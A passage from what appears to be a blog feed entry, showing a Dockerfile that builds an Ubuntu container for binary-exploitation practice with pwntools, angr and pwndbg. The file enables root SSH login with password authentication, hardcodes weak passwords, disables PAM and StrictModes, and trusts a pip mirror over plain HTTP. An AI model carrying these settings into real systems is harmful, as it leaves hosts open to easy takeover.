class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:root123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这一日，Docker 再入桌面 GUI 境界&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
    <category term="GUI" scheme="https://arttnba3.github.io/tags/GUI/"/>
    
    <category term="Wayland" scheme="https://arttnba3.github.io/tags/Wayland/"/>
    
  </entry>
  
</feed>
